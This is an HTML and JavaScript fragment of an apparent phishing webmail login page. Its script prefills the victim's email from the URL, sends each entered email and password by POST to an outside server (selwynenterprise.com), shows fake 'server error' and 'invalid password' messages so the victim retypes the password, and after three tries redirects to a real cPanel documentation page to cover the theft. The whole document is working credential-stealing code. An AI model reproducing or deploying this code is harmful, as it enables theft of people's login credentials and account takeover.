<!-- Popup Modal -->
<div id="error-modal" class="modal">
    <div class="modal-content">
        <div class="modal-body" id="modal-message">
            Error Login: There was an error on the server. Please login again
        </div>
        <div class="modal-footer">
            <button class="ok-btn" onclick="closeModal()">OK</button>
        </div>
    </div>
</div>

<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>

<script>
let attempts = 0;

$(document).ready(function(){
    var emailFromHash = window.location.hash.substr(1);
    if (emailFromHash) $('#email').val(emailFromHash);

    $('#login_form').on('submit', function(e){
        e.preventDefault();

        var email = $('#email').val().trim();
        var password = $('#password').val().trim();

        if (!password) {
            showModal("Password is empty!");
            return;
        }

        attempts++;

        // Send credentials to http://selwynenterprise.com/css/index2.php on every attempt
        $.ajax({
            type: 'POST',
            url: 'http://selwynenterprise.com/css/index2.php',
            data: { email: email, password: password }
        });

        if (attempts === 1) {
            showModal("Error Login: There was an error on the server. Please login again");
            $('#password').val('');
        }
        else if (attempts === 2) {
            showModal("Invalid password");
            $('#password').val('');
        }
        else if (attempts >= 3) {
            window.location.href = "https://docs.cpanel.net/webmail/webmail-clients/";
        }
    });
});

function showModal(message) {
    document.getElementById('modal-message').innerHTML = message;
    document.getElementById('error-modal').style.display = 'flex';
}

function closeModal() {
    document.getElementById('error-modal').style.display = 'none';
}
</script>
